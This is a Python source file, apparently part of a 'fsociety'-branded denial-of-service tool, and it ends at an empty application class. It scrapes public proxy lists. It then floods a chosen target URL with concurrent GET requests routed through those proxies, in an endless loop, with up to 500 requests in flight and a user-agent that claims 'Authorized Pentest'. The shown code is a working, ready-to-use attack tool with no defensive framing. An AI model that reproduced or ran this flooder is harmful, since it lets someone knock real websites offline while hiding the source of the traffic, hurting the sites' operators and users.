import threading
import asyncio
import aiohttp
import random
import time
import urllib.request
from datetime import datetime

class ProxyFetcher:
    @staticmethod
    def fetch():
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
        ]
        proxies = []
        for url in urls:
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=5) as r:
                    data = r.read().decode()
                    proxies.extend([l.strip() for l in data.split('\n') if ':' in l][:50])
            except: pass
        return list(set(proxies)) if proxies else []

class AttackWorker:
    def __init__(self):
        self.running = False
        self.stats = {"sent": 0, "success": 0, "failed": 0}
        self.proxies = []
        self.target = ""
        self.rpp = 100
        
    async def attack(self, update_cb):
        self.running = True
        semaphore = asyncio.Semaphore(500)
        
        async def send_one(proxy):
            if not self.running: return
            async with semaphore:
                try:
                    timeout = aiohttp.ClientTimeout(total=5)
                    proxy_url = f"http://{proxy}" if not proxy.startswith('http') else proxy
                    
                    async with aiohttp.ClientSession(timeout=timeout) as s:
                        headers = {"User-Agent": random.choice([
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                            "fsociety-bot/5.0 (Authorized Pentest)"
                        ])}
                        async with s.get(self.target, headers=headers, proxy=proxy_url, ssl=False) as r:
                            self.stats["sent"] += 1
                            if r.status == 200:
                                self.stats["success"] += 1
                            else:
                                self.stats["failed"] += 1
                            if self.stats["sent"] % 10 == 0:
                                update_cb()
                except:
                    self.stats["failed"] += 1
                    self.stats["sent"] += 1
                    
        while self.running:
            tasks = []
            for p in self.proxies:
                for _ in range(min(self.rpp, 5)):
                    tasks.append(send_one(p))
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

class FsocietyApp:
